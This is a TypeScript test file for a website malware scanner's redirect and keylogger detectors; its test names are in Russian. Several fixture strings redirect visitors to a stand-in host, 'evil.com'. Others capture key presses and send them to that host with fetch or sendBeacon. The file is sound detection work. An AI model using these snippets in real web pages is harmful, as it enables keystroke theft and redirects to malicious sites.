import { describe, it, expect } from 'vitest';
import { parseJs } from '../../ast/parse.js';
import { detectRedirect } from '../detect-redirect.js';
import { detectKeylogger } from '../detect-keylogger.js';
import type { DetectorContext } from '../../ast/types.js';

const MAIN = 'mysite.com';
const ctx = (source: string): DetectorContext => ({ source, relPath: 't.js', mainHost: MAIN });
const redirected = (src: string): boolean => {
  const ast = parseJs(src, 't.js')!;
  return detectRedirect(ast, ctx(src)).some((r) => r.threatType === 'redirect');
};
const keylogged = (src: string): boolean => {
  const ast = parseJs(src, 't.js')!;
  return detectKeylogger(ast, src).some((r) => r.threatType === 'keylogger');
};

describe('RED-1 — расширенное покрытие редиректов (WARN)', () => {
  it('location.assign(external)', () => {
    expect(redirected(`location.assign('https://evil.com/o')`)).toBe(true);
  });
  it('top.location = external', () => {
    expect(redirected(`top.location = 'https://evil.com/o'`)).toBe(true);
  });
  it('self.location.href = external', () => {
    expect(redirected(`self.location.href = 'https://evil.com/o'`)).toBe(true);
  });
  it("location['href'] = external (//host)", () => {
    expect(redirected(`location['href'] = '//evil.com/o'`)).toBe(true);
  });
  it('bare location = external', () => {
    expect(redirected(`location = 'https://evil.com/o'`)).toBe(true);
  });

  it('НЕ-регресс: location.href = "/local" не флагается', () => {
    expect(redirected(`location.href = '/thank-you'`)).toBe(false);
  });
  it('НЕ-регресс: редирект на свой хост не флагается', () => {
    expect(redirected(`location.href = 'https://mysite.com/next'`)).toBe(false);
  });
  it('НЕ-регресс: классический location.href = external по-прежнему ловится', () => {
    expect(redirected(`location.href = 'https://evil.com/o'`)).toBe(true);
  });
});

describe('KEY-1 — keylogger через присваивание on*-свойства (WARN)', () => {
  it('document.onkeydown = function(){ fetch(...) }', () => {
    expect(keylogged(`document.onkeydown = function(e){ fetch('https://evil.com/k?'+e.key); }`)).toBe(true);
  });
  it('el.onkeyup = e => navigator.sendBeacon(...)', () => {
    expect(keylogged(`el.onkeyup = function(e){ navigator.sendBeacon('https://evil.com', e.key); }`)).toBe(true);
  });

  it('НЕ-регресс: addEventListener keydown + fetch по-прежнему ловится', () => {
    expect(keylogged(`addEventListener('keydown', function(e){ fetch('https://evil.com', {body:e.key}); })`)).toBe(true);
  });
  it('НЕ-регресс: onkeydown без сетевого вызова не флагается', () => {
    expect(keylogged(`document.onkeydown = function(){ highlight(); }`)).toBe(false);
  });
  it('НЕ-регресс: onclick (не key) не флагается', () => {
    expect(keylogged(`document.onclick = function(){ fetch('https://evil.com'); }`)).toBe(false);
  });
});
